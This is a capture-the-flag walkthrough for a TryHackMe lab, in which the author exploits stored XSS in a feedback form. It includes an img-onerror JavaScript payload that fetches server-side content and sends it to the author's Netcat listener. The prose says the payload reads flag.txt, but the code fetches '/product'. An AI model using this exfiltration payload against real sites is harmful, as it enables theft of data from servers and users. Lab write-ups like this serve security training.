Link to machine : https://tryhackme.com/room/thestickershop

# SCANNING

I performed an **nmap** aggressive scan to identify open ports and the services running on the target.

![](IMAGES/1.png)

# CAPTURING THE FLAG

Since I already had the path to flag, I tried accessing it directly.

![](IMAGES/2.png)

I did not have the appropriate permissions, so I visited the web site hosted on the target.

![](IMAGES/3.png)

The site contained a feedback field.

![](IMAGES/4.png)

I tried executing a cross site scripting payload.

![](IMAGES/5.png)

My XSS payload worked, hence I modified my payload to make the server send a request to my local machine.

![](IMAGES/6.png)

Upon execution, my local machine received a GET request from the server.

![](IMAGES/7.png)

Hence, I used the below payload to make the server get the data from *flag.txt* and then send it to my local machine through a GET request.

```html
<img src='a' onerror='
  fetch("http://localhost:12345/product")  // Send the request to your local Netcat listener
    .then(response => response.text())  // Get the response text
    .then(data => {
      fetch("http://localhost:12345?data=" + encodeURIComponent(data));  // Send the fetched data to Netcat
    })
    .catch(err => console.error("Error fetching data:", err));
'>
```

![](IMAGES/8.png)

Upon execution, I successfully received the value of the flag.

![](IMAGES/9.png)

Happy Hacking !

---
